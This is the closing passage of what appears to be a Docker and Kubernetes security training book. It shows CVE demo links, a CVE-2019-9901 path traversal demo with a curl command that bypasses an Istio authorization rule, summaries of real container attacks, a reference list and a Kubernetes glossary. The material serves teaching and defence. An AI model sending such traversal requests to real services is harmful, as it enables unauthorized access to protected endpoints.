<p><img src="demos/images/CVE-2019-5736_1.gif" alt="" /></p>
<h2><a class="header" href="#example-of-malicious-docker-image" id="example-of-malicious-docker-image">Example of malicious Docker image</a></h2>
<p><img src="demos/images/CVE-2019-5736_2.gif" alt="" /></p>
<h3><a class="header" href="#references-12" id="references-12">References</a></h3>
<ul>
<li><a href="https://www.openwall.com/lists/oss-security/2019/02/13/3">CVE-2019-5736: runc container breakout exploit code</a></li>
<li><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host</a></li>
<li><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">CVE-2019-5736-PoC</a></li>
</ul>
<h1><a class="header" href="#cve-2019-9901---istioenvoy-path-traversal" id="cve-2019-9901---istioenvoy-path-traversal">CVE-2019-9901 - Istio/Envoy Path traversal</a></h1>
<p>This scenario demos has been taken from <a href="https://github.com/eoftedal/writings/blob/master/published/CVE-2019-9901-path-traversal.md">https://github.com/eoftedal/writings/blob/master/published/CVE-2019-9901-path-traversal.md</a>. Thanks to <a href="https://github.com/eoftedal">Erlend Oftedal</a></p>
<p>A simple project with a web server and deployed it on Kubernetes. The web application had two endpoints <code>/public/</code> and <code>/secret/</code>. Added an authorization policy which tried to grant access to anything below <code>/public/</code>:</p>
<pre><code class="language-yaml">  rules:
  - services: [&quot;backend.fishy.svc.cluster.local&quot;]
    methods: [&quot;GET&quot;]
    paths: [&quot;/public/*&quot;]
</code></pre>
<p>Then used standard path traversal from curl:</p>
<pre><code class="language-bash">curl -vvvv --path-as-is  &quot;http://backend.fishy.svc.cluster.local:8081/public/../secret/&quot;
</code></pre>
<p>And was able to reach <code>/secret/</code>.</p>
<h3><a class="header" href="#reference-1" id="reference-1">Reference</a></h3>
<ul>
<li><a href="https://github.com/envoyproxy/envoy/blob/master/security/postmortems/cve-2019-9900.md">Security postmortem for CVE-2019-9900, CVE-2019-9901</a></li>
<li><a href="https://istio.io/blog/2019/announcing-1.1.2/#vulnerability-impact">Announcing Istio 1.1.2 with Important Security Update</a></li>
<li><a href="https://github.com/eoftedal/writings/blob/master/published/CVE-2019-9901-path-traversal.md">CVE-2019-9901 - Istio/Envoy Path traversal</a></li>
<li><a href="https://medium.com/solo-io/envoy-proxy-high-severity-vulnerabilities-that-can-lead-to-exposure-of-unauthorized-services-e5af25b022de">Envoy Proxy — high severity vulnerabilities that can lead to exposure of unauthorized services</a></li>
</ul>
<h1><a class="header" href="#fun-learning-about-kubernetes" id="fun-learning-about-kubernetes">Fun Learning About Kubernetes</a></h1>
<ul>
<li><a href="extra/contianed-af.html">Contained.af</a></li>
<li><a href="extra/play-with-docker.html">Play with Docker</a></li>
<li><a href="extra/katacoda.html">Katacoda Docker Security</a></li>
<li><a href="extra/play-with-kubernetes.html">Play with Kubernetes</a></li>
</ul>
<h1><a class="header" href="#containedaf" id="containedaf">Contained.af</a></h1>
<blockquote>
<p>Game for learning about containers, capabilities, and syscalls by <a href="https://github.com/jessfraz">@jessfraz</a></p>
</blockquote>
<p>There is a CTF on every VM instance. If  you manage to break out of the container, email <code>not.quite@contained.af</code> and you will be rewarded. If  you bother this email address with anything that is not the ascii art contents of the flag file you will be ignored.</p>
<p><img src="extra/images/contained-af.png" alt="Contained.af Game" /></p>
<ul>
<li>Play the game at <a href="https://contained.af/">https://contained.af</a></li>
</ul>
<h1><a class="header" href="#play-with-docker" id="play-with-docker">Play with Docker</a></h1>
<p>The Play with Docker classroom brings you labs and tutorials that help you get hands-on experience using Docker. In this classroom you will find a mix of labs and tutorials that will help Docker users, including SysAdmins, IT Pros, and Developers. There is a mix of hands-on tutorials right in the browser, instructions on setting up and using Docker in your own environment, and resources about best practices for developing and deploying your own applications.</p>
<p><img src="extra/images/play-with-docker.png" alt="Play with Docker" /></p>
<h3><a class="header" href="#references-13" id="references-13">References</a></h3>
<ul>
<li><a href="https://training.play-with-docker.com/">https://training.play-with-docker.com</a></li>
</ul>
<h1><a class="header" href="#katacoda-docker-security" id="katacoda-docker-security">Katacoda Docker Security</a></h1>
<p>Learn Docker Security using Interactive Browser-Based Scenarios. Solve real problems and enhance your skills with browser based hands on labs without any downloads or configuration</p>
<p><img src="extra/images/katacoda.png" alt="Katacoda Docker Security" /></p>
<h3><a class="header" href="#references-14" id="references-14">References</a></h3>
<ul>
<li><a href="https://www.katacoda.com/courses/docker-security">https://www.katacoda.com/courses/docker-security</a></li>
</ul>
<h1><a class="header" href="#play-with-kubernetes" id="play-with-kubernetes">Play with Kubernetes</a></h1>
<p>Play with Kubernetes is a labs site provided by Docker and created by Tutorius. Play with Kubernetes is a playground which allows users to run K8s clusters in a matter of seconds. It gives the experience of having a free Alpine Linux Virtual Machine in browser. Under the hood Docker-in-Docker (DinD) is used to give the effect of multiple VMs/PCs.</p>
<p>If you want to learn more about Kubernetes, consider the Play with Kubernetes Classroom which provides more directed learning using an integrated Play with Kubernetes commandline.</p>
<p><a href="https://labs.play-with-k8s.com/">https://labs.play-with-k8s.com</a></p>
<h2><a class="header" href="#kubernetes-for-beginners" id="kubernetes-for-beginners">Kubernetes for Beginners</a></h2>
<p>In this hands-on workshop, you will learn the basic concepts of Kubernetes. You will do that through interacting with Kubernetes through the command line terminals on the right. Ultimately you will deploy the sample application <code>Dockercoins</code> on both worker nodes.</p>
<p><a href="https://training.play-with-kubernetes.com/kubernetes-workshop/">https://training.play-with-kubernetes.com/kubernetes-workshop/</a></p>
<h2><a class="header" href="#katacoda" id="katacoda">Katacoda</a></h2>
<p>This is a Kubernetes playground. From here you can play with a Kubernetes host and explore it's API.</p>
<blockquote>
<p>Playgrounds give you a configured environment to start playing and exploring using an unstructured learning approach</p>
</blockquote>
<p><a href="https://www.katacoda.com/courses/kubernetes/playground">https://www.katacoda.com/courses/kubernetes/playground</a></p>
<h1><a class="header" href="#popular-attacks" id="popular-attacks">Popular Attacks</a></h1>
<ul>
<li><a href="popular-attacks/dockerhub-190k.html">Dockerhub 190k accounts</a></li>
<li><a href="popular-attacks/cryptojacking.html">Cryptojacking using public docker containers</a></li>
<li><a href="popular-attacks/dockerhub.html">Dockerhub known vulnerable images</a></li>
<li><a href="popular-attacks/service-token.html">BSidesSF CTF cluster pwn</a></li>
<li><a href="popular-attacks/metadata.html">Shopify metadata to cluster pwn</a></li>
</ul>
<h1><a class="header" href="#dockerhub-190k-accounts-hacked" id="dockerhub-190k-accounts-hacked">Dockerhub 190k accounts hacked</a></h1>
<p>Docker Hub has been compromised very recently and this attack has put almost 190K users at risk. More details pointing to discussion at <a href="https://news.ycombinator.com/item?id=19763413">Hacker News</a></p>
<ul>
<li><a href="https://blog.madhuakula.com/some-tips-to-review-docker-hub-hack-of-190k-accounts-addcd602aade">Some tips to review Docker Hub Hack of 190k accounts</a></li>
</ul>
<h1><a class="header" href="#cryptojacking-using-public-docker-containers" id="cryptojacking-using-public-docker-containers">Cryptojacking using public docker containers</a></h1>
<p>Kromtech Security Center found 17 malicious docker images stored on Docker Hub for an entire year. Even after several complaints on GitHub and Twitter, research made by sysdig.com and fortinet.com, cybercriminals continued to enlarge their malware armory on Docker Hub. With more than 5 million pulls, the <code>docker123321</code> registry is considered a springboard for cryptomining containers. Today’s growing number of publicly accessible misconfigured orchestration platforms like Kubernetes allows hackers to create a fully automated tool that forces these platforms to mine Monero. By pushing malicious images to a Docker Hub registry and pulling it from the victim’s system, hackers were able to mine <code>544.74</code> Monero, which is equal to <code>$90000</code>.</p>
<ul>
<li>Read more about <a href="https://kromtech.com/blog/security-center/cryptojacking-invades-cloud-how-modern-containerization-trend-is-exploited-by-attackers">Cryptojacking invades cloud. How modern containerization trend is exploited by attackers</a></li>
</ul>
<h1><a class="header" href="#dockerhub-known-vulnerable-images" id="dockerhub-known-vulnerable-images">Dockerhub known vulnerable images</a></h1>
<p>Docker containers have recently become a popular approach to provision multiple applications over shared physical hosts in a more lightweight fashion than traditional virtual machines. This popularity has led to the creation of the Docker Hub registry, which distributes a large number of official and community images. In this paper, we study the state of security vulnerabilities in Docker Hub images. We create a scalable Docker image vulnerability analysis (DIVA) framework that automatically discovers, downloads, and analyzes both official and community images on Docker Hub.</p>
<p>Using our framework, we have studied 356,218 images and made the following findings:</p>
<ol>
<li>Both official and community images contain more than 180 vulnerabilities on average when considering all versions</li>
<li>Many images have not been updated for hundreds of days</li>
<li>Vulnerabilities commonly propagate from parent images to child images</li>
</ol>
<p>These findings demonstrate a strong need for more automated and systematic methods of applying security updates to Docker images and our current Docker image analysis framework provides a good foundation for such automatic security update.</p>
<ul>
<li>
<p>Read more about <a href="http://dance.csc.ncsu.edu/papers/codaspy17.pdf">A Study of Security Vulnerabilities on Docker Hub</a></p>
</li>
<li>
<p><a href="https://dl.acm.org/citation.cfm?id=3029832">Research Paper</a></p>
</li>
</ul>
<h1><a class="header" href="#bsidessf-ctf-cluster-pwn" id="bsidessf-ctf-cluster-pwn">BSidesSF CTF cluster pwn</a></h1>
<p>The challenges for the BsidesSF CTF were run in Docker containers on Kubernetes using Google Container Engine. Because of the two infrastructure issues, it was possible to exploit one of the early challenges, steal service account keys, and then use those keys to directly access flags.</p>
<ul>
<li>Read more about <a href="https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0">Capturing all the flags in BSidesSF CTF by pwning our infrastructure</a></li>
</ul>
<h1><a class="header" href="#shopify-metadata-to-cluster-pwn" id="shopify-metadata-to-cluster-pwn">Shopify metadata to cluster pwn</a></h1>
<p>The application vulnerability Server-Side Request Forgery (SSRF) in one of the container running in Kubernetes cluster allows attacker to access and gain control over the entire shopify cluster and instances.</p>
<ul>
<li>Read more about <a href="https://hackerone.com/reports/341876">SSRF to ROOT access in all instances</a></li>
</ul>
<h1><a class="header" href="#references-15" id="references-15">References</a></h1>
<ul>
<li><a href="https://docs.docker.com/engine/security/security">Docker Security</a></li>
<li><a href="https://blog.docker.com/2015/05/understanding-docker-security-and-best-practices">Understanding Docker Security and Best Practices</a></li>
<li><a href="https://www.cisecurity.org/benchmark/docker">CIS Benchmarks Docker</a></li>
<li><a href="https://docs.docker.com/registry/">Docker Registry</a></li>
<li><a href="https://docs.docker.com/config/daemon">Docker Daemon Configuration</a></li>
<li><a href="https://www.nccgroup.trust/us/our-research/understanding-and-hardening-linux-containers">Understanding and Hardening Linux Containers</a></li>
<li><a href="https://www.nccgroup.trust/uk/our-research/abusing-privileged-and-unprivileged-linux-containers">Abusing Privileged and Unprivileged Linux Containers</a></li>
<li><a href="https://www.sans.org/reading-room/whitepapers/assurance/security-assurance-docker-containers-37432">Security Assurance of Docker Containers</a></li>
<li><a href="https://labs.play-with-docker.com">Play with Docker</a></li>
<li><a href="https://gist.github.com/FrankSpierings/5c79523ba693aaa38bc963083f48456c">Container Security Notes</a></li>
<li><a href="https://www.katacoda.com/courses/docker">Katacoda</a></li>
<li><a href="https://github.com/makash/linux-container-security-docs">Linux Container Security</a></li>
<li><a href="https://github.com/wsargent/docker-cheat-sheet">Docker Cheat Sheet</a></li>
<li><a href="https://docs.docker.com/engine/security/trust/content_trust">Docker content trust</a></li>
<li><a href="https://github.com/coreos/clair">Clair</a></li>
<li><a href="https://anchore.com/opensource">Anchore</a></li>
<li><a href="https://github.com/future-architect/vuls">Vuls</a></li>
<li><a href="https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities">Docker Runtime Privileges and Capabilities</a></li>
<li><a href="https://stackoverflow.com/questions/36425230/privileged-containers-and-capabilities">Privileged Container &amp; Capabilities</a></li>
<li><a href="https://github.com/jessfraz/amicontained">amicontained repository</a></li>
<li><a href="https://docs.docker.com/engine/security/apparmor">Apparmor Security Profiles on Docker</a></li>
<li><a href="https://docs.docker.com/engine/security/seccomp">Seccomp Security Profiles on Docker</a></li>
<li><a href="https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell">NodeJS Simple RCE</a></li>
<li><a href="https://github.com/docker/labs/tree/master/security/capabilities">Docker Labs Capabilities</a></li>
<li><a href="http://www.projectatomic.io/blog/2016/03/dwalsh_selinux_containers">Practical SELinux and Containers</a></li>
<li><a href="https://gist.github.com/FrankSpierings/5c79523ba693aaa38bc963083f48456c">Container Security Notes gist</a></li>
<li><a href="https://gist.github.com/acolyer/23043b422046803d0a78ceb934fa8cc0">Containers and Operating systems morning paper gist</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery">SSRF Bypasses</a></li>
<li><a href="http://docs.kubernetes.io/">Kubernetes Docs</a></li>
<li><a href="https://kubernetes-security.info/">Kubernetes Security Info</a></li>
<li><a href="https://www.youtube.com/playlist?list=PLF3s2WICJlqOiymMaTLjwwHz-MSVbtJPQ">Kubernetes Webinar series </a></li>
<li><a href="https://github.com/ahmetb/kubernetes-network-policy-recipes">Kubernetes Network Policies</a></li>
<li><a href="https://engineering.bitnami.com/articles/helm-security.html">Helm Tiller Attack</a></li>
<li><a href="https://github.com/wagoodman/dive">A tool for exploring each layer in a docker image</a></li>
<li><a href="https://github.com/goodwithtech/dockle">Container Image Linter for Security</a></li>
</ul>
<h1><a class="header" href="#kubernetes-glossary" id="kubernetes-glossary">Kubernetes Glossary</a></h1>
<h3><a class="header" href="#annotation" id="annotation">Annotation</a></h3>
<p>A key-value pair that is used to attach arbitrary non-identifying metadata to objects</p>
<h3><a class="header" href="#cluster" id="cluster">Cluster</a></h3>
<p>A set of machines, called nodes, that run containerized applications managed by Kubernetes</p>
<h2><a class="header" href="#container" id="container">Container</a></h2>
<p>A lightweight and portable executable image that contains software and all of its dependencies</p>
<h3><a class="header" href="#container-environment-variables" id="container-environment-variables">Container Environment Variables</a></h3>
<p>Container environment variables are name=value pairs that provide useful information into containers running in a Pod</p>
<h2><a class="header" href="#controller" id="controller">Controller</a></h2>
<p>A control loop that watches the shared state of the cluster through the apiserver and makes changes attempting to move the current state towards the desired state</p>
<h2><a class="header" href="#customresourcedefinition" id="customresourcedefinition">CustomResourceDefinition</a></h2>
<p>Custom code that defines a resource to add to your Kubernetes API server without building a complete custom server</p>
<h2><a class="header" href="#daemonset" id="daemonset">DaemonSet</a></h2>
<p>Ensures a copy of a Pod is running across a set of nodes in a cluster </p>
<h2><a class="header" href="#deployment" id="deployment">Deployment</a></h2>
<p>An API object that manages a replicated application</p>
<h2><a class="header" href="#extensions" id="extensions">Extensions</a></h2>
<p>Extensions are software components that extend and deeply integrate with Kubernetes to support new types of hardware</p>
<h2><a class="header" href="#image" id="image">Image</a></h2>
<p>Stored instance of a container that holds a set of software needed to run an application</p>
<h2><a class="header" href="#init-container" id="init-container">Init Container</a></h2>
<p>One or more initialization containers that must run to completion before any app containers run</p>
<h2><a class="header" href="#job" id="job">Job</a></h2>
<p>A finite or batch task that runs to completion</p>
<h2><a class="header" href="#kubectl" id="kubectl">Kubectl</a></h2>
<p>A command line tool for communicating with a Kubernetes API server</p>
<h2><a class="header" href="#kubelet" id="kubelet">Kubelet</a></h2>
<p>An agent that runs on each node in the cluster. It makes sure that containers are running in a pod</p>
<h2><a class="header" href="#kubernetes-api" id="kubernetes-api">Kubernetes API</a></h2>
<p>The application that serves Kubernetes functionality through a RESTful interface and stores the state of the cluster</p>
<h2><a class="header" href="#label" id="label">Label</a></h2>
<p>Tags objects with identifying attributes that are meaningful and relevant to users</p>
<h2><a class="header" href="#minikube" id="minikube">Minikube</a></h2>
<p>A tool for running Kubernetes locally</p>
<h2><a class="header" href="#name" id="name">Name</a></h2>
<p>A client-provided string that refers to an object in a resource URL, such as /api/v1/pods/some-name</p>
<h2><a class="header" href="#namespace" id="namespace">Namespace</a></h2>
<p>An abstraction used by Kubernetes to support multiple virtual clusters on the same physical cluster </p>
<h2><a class="header" href="#node" id="node">Node</a></h2>
<p>A node is a worker machine in Kubernetes</p>
<h2><a class="header" href="#pod" id="pod">Pod</a></h2>
<p>The smallest and simplest Kubernetes object. A Pod represents a set of running containers on your cluster</p>
<h2><a class="header" href="#pod-security-policy" id="pod-security-policy">Pod Security Policy</a></h2>
<p>Enables fine-grained authorization of Pod Priority creation and updates</p>
<h2><a class="header" href="#rbac-role-based-access-control" id="rbac-role-based-access-control">RBAC (Role-Based Access Control)</a></h2>
<p>Manages authorization decisions, allowing admins to dynamically configure access policies through the Kubernetes API </p>
<h2><a class="header" href="#replicaset" id="replicaset">ReplicaSet</a></h2>
<p>ReplicaSet is the next-generation Replication Controller</p>
<h2><a class="header" href="#resource-quotas" id="resource-quotas">Resource Quotas</a></h2>
<p>Provides constraints that limit aggregate resource consumption per Namespace </p>
<h2><a class="header" href="#selector" id="selector">Selector</a></h2>
<p>Allows users to filter a list of resources based on labels</p>
<h2><a class="header" href="#service" id="service">Service</a></h2>
<p>An API object that describes how to access applications, such as a set of Pods , and can describe ports and load-balancers</p>
<h2><a class="header" href="#service-account" id="service-account">Service Account</a></h2>
<p>Provides an identity for processes that run in a Pod </p>
<h2><a class="header" href="#statefulset" id="statefulset">StatefulSet</a></h2>
<p>Manages the deployment and scaling of a set of Pods , and provides guarantees about the ordering and uniqueness of these Pods</p>
<h2><a class="header" href="#taint" id="taint">Taint</a></h2>
<p>A key-value pair and an effect to prevent the scheduling of pods on nodes or node groups</p>
<h2><a class="header" href="#toleration" id="toleration">Toleration</a></h2>
<p>A key-value pair and an effect to enable the scheduling of pods on nodes or node groups that have a matching taints </p>
<h2><a class="header" href="#uid" id="uid">UID</a></h2>
<p>A Kubernetes systems-generated string to uniquely identify objects</p>
<h2><a class="header" href="#volume" id="volume">Volume</a></h2>
<p>A directory containing data, accessible to the containers in a pod </p>
<h2><a class="header" href="#docker" id="docker">docker</a></h2>
<p>Docker is a software technology providing operating-system-level virtualization also known as containers</p>
<h2><a class="header" href="#kube-apiserver" id="kube-apiserver">kube-apiserver</a></h2>
<p>Component on the master that exposes the Kubernetes API. It is the front-end for the Kubernetes control plane</p>
<h2><a class="header" href="#kube-controller-manager" id="kube-controller-manager">kube-controller-manager</a></h2>
<p>Component on the master that runs controllers </p>
<h2><a class="header" href="#kube-proxy" id="kube-proxy">kube-proxy</a></h2>
<p>kube-proxy is a network proxy that runs on each node in the cluster</p>
<h2><a class="header" href="#references-16" id="references-16">References</a></h2>
<ul>
<li><a href="https://kubernetes.io/docs/reference/glossary/?fundamental=true">https://kubernetes.io/docs/reference/glossary/?fundamental=true</a></li>
</ul>
<h1><a class="header" href="#about-appsecco" id="about-appsecco">About Appsecco</a></h1>
<p><a href="https://appsecco.com"><img src="about-us/images/about-appsecco.png" alt="About Appsecco" /></a></p>
<p>Appsecco is a specialist application security company, founded in 2015, with physical presence in London, Bangalore, Doha and Boston, providing industry leading security advice that is firmly grounded in commercial reality.</p>
<p>Our services cover the entire software development lifecycle from advising on how build and foster a culture of security within development teams and organisations to reviewing and advising on the security of applications and associated infrastructure under development to providing rapid response and advice in the event of a security breach or incident.</p>
<p>As a team, we are highly qualified and have many years of extensive experience working with clients across multiple counties and in a wide range of industries and sectors; from financial services to software development, manufacturing to governmental organisations and consumer brands to ecommerce.</p>
<p>The solutions, advice and insight we deliver to our clients always follows three core principles:</p>
<ol>
<li>It must be pragmatic; taking into account the specific commercial, organisational and operational realities of each client individually</li>
<li>It must genuinely add value; the advice or solutions we provide must addresses the specific problem a client seeks to solve and have actionable insight to enable them to achieve this</li>
<li>Never be purely automated; whenever we are testing for security our reports and output always have significant, expert, human input to give the greatest possible value for our clients</li>
</ol>
<p>In addition to their client-facing work our technical team are actively involved in researching and developing new and better ways to stay secure and can regularly be found presenting their findings at industry conferences and events ranging from nullcon in India, DevSecCon in London and Singapore, to DEF CON, the world’s largest security conference held annually in the USA.</p>
<p>Structurally we are a UK Limited company with a wholly owned Indian subsidiary (where the majority of our technical resource is based) and raised seed funding for our continuing growth in the UK in late 2016.</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                

                
            </nav>

        </div>

        

        
        <!-- Google Analytics Tag -->
        <script type="text/javascript">
            var localAddrs = ["localhost", "127.0.0.1", ""];

            // make sure we don't activate google analytics if the developer is
            // inspecting the book locally...
            if (localAddrs.indexOf(document.location.hostname) === -1) {
                (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
                m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
                })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

                ga('create', 'UA-15752161-2', 'auto');
                ga('send', 'pageview');
            }
        </script>
        

        
        
        
        <script type="text/javascript">
            window.playpen_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        
        
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
        
        

    </body>
</html>
